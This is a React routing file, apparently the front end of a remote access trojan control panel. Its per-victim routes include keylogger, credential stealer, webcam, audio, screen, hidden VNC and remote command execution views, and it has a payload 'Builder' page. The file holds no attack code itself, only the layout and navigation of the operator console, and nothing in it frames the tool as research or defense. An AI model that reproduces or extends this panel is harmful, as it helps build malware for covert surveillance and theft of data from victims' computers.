import React from 'react';
import { BrowserRouter, Routes, Route, Navigate } from 'react-router-dom';
import Sidebar from './components/Sidebar';
import Dashboard from './pages/Dashboard';
import ClientDetail from './pages/ClientDetail';
import Builder from './components/Builder';
import Settings from './pages/Settings';

function App() {
  return (
    <BrowserRouter>
      <div className="flex h-screen bg-[#111] text-gray-200 font-sans">
        {/* Fixed Width Sidebar (The Rail) */}
        <Sidebar />
        
        {/* Main Content Area */}
        <main className="flex-1 overflow-hidden relative bg-[#161616]">
          {/* Top Bar / Header Area could go here if needed */}
          <div className="h-full overflow-y-auto p-6 scrollbar-thin">
            <Routes>
              <Route path="/" element={<Dashboard />} />
              <Route path="/builder" element={<Builder />} />
              <Route path="/settings" element={<Settings />} />
              
              {/* Client Routes */}
              <Route path="/client/:id" element={<ClientDetail initialTab="terminal" />} />
              <Route path="/client/:id/screen" element={<ClientDetail initialTab="screen" />} />
              <Route path="/client/:id/webcam" element={<ClientDetail initialTab="webcam" />} />
              <Route path="/client/:id/audio" element={<ClientDetail initialTab="audio" />} />
              <Route path="/client/:id/keylog" element={<ClientDetail initialTab="keylog" />} />
              <Route path="/client/:id/stealer" element={<ClientDetail initialTab="stealer" />} />
              <Route path="/client/:id/files" element={<ClientDetail initialTab="files" />} />
              <Route path="/client/:id/process" element={<ClientDetail initialTab="process" />} />
              <Route path="/client/:id/browser" element={<ClientDetail initialTab="browser" />} />
              <Route path="/client/:id/chat" element={<ClientDetail initialTab="chat" />} />
              <Route path="/client/:id/sysinfo" element={<ClientDetail initialTab="sysinfo" />} />
              <Route path="/client/:id/hvnc" element={<ClientDetail initialTab="hvnc" />} />
              <Route path="/client/:id/exec" element={<ClientDetail initialTab="exec" />} />
              
              {/* Fallback */}
              <Route path="*" element={<Navigate to="/" replace />} />
            </Routes>
          </div>
        </main>
      </div>
    </BrowserRouter>
  );
}

export default App;
